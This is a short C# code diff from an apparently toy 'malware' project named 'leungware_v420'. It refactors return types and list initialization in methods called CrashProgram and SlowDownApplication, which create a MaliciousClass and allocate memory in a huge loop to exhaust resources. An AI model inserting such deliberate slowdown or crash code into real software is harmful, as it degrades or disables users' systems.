@@ -15,7 +15,7 @@ namespace leungware_v420
             }
         }
 
-        private static Double[] GetData()
+        private static IEnumerable<double> GetData()
         {
             Random rnd = new Random();
             List<double> valuesDoubles = new List<double>();
@@ -29,7 +29,7 @@ namespace leungware_v420
 
         public void CrashProgram()
         {
-            Double[] values = GetData();
+            IEnumerable<double> values = GetData();
         }
 
         public void SlowDownApplication(int dividend)
@@ -37,8 +37,7 @@ namespace leungware_v420
             for (long i = 0; (i < int.MaxValue / dividend); i++)
             {
                 var inst = new MaliciousClass();
-                List<double> strList = new List<double>();
-                strList.Add(Double.MaxValue);
+                List<double> strList = new List<double> {double.MaxValue};
             }
         }
     }
